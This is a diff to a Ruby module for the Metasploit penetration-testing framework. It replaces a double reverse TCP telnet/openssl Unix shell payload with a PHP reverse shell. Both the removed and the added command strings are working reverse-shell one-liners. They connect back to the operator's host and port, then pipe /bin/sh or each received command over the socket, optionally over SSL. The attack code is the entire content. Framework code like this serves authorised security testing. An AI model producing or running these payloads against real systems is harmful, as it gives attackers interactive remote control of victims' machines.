@@ -10,7 +10,7 @@
 ##
 
 require 'msf/core'
-require 'msf/core/handler/reverse_tcp_double'
+require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
@@ -21,20 +21,17 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'Unix Command Shell, Double reverse TCP (telnet) or Double reverse SSL (openssl)',
+			'Name'          => 'Unix Command Shell, Reverse TCP (via php)',
 			'Version'       => '$Revision$',
-			'Description'   => 'Creates an interactive shell through two inbound connections',
-			'Author'        => [
-						'hdm', # original module
-						'RageLtMan' # SSL patch
-					],
-			'License'       => MSF_LICENSE,
+			'Description'   => 'Creates an interactive shell via php, supports SSL',
+			'Author'        => 'RageLtMan',
+			'License'       => BSD_LICENSE,
 			'Platform'      => 'unix',
 			'Arch'          => ARCH_CMD,
-			'Handler'       => Msf::Handler::ReverseTcpDouble,
+			'Handler'       => Msf::Handler::ReverseTcp,
 			'Session'       => Msf::Sessions::CommandShell,
 			'PayloadType'   => 'cmd',
-			'RequiredCmd'   => 'telnet',
+			'RequiredCmd'   => 'php',
 			'Payload'       =>
 				{
 					'Offsets' => { },
@@ -55,21 +52,14 @@ module Metasploit3
 	# Returns the command string to use for execution
 	#
 	def command_string
+		lhost = datastore['LHOST']
+		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
+		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
 		if datastore['SSL']
-			# PoC for ssl shell implementation with SslTcpServer
-			cmd = "sh -c '(openssl s_client -connect #{datastore['LHOST']}:#{datastore['LPORT']}|" +
-				"/bin/sh 2&>1|openssl s_client -connect #{datastore['LHOST']}:" +
-				"#{datastore['LPORT']})'>/dev/null 2>&1 &"
+			cmd = "php -r '$s=fsockopen(\"ssl://#{datastore['LHOST']}\",#{datastore['LPORT']});while(!feof($s)){exec(fgets($s),$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}'&"
 		else
-			cmd =
-				"sh -c '(sleep #{3600+rand(1024)}|" +
-				"telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
-				"while : ; do sh && break; done 2>&1|" +
-				"telnet #{datastore['LHOST']} #{datastore['LPORT']}" +
-				" >/dev/null 2>&1 &)'"
+			cmd = "php -r '$s=fsockopen(\"#{datastore['LHOST']}\",#{datastore['LPORT']});exec(\"/bin/sh -i <&3 >&3 2>&3\");'&"
 		end
-
-		return cmd
 	end
 
 end
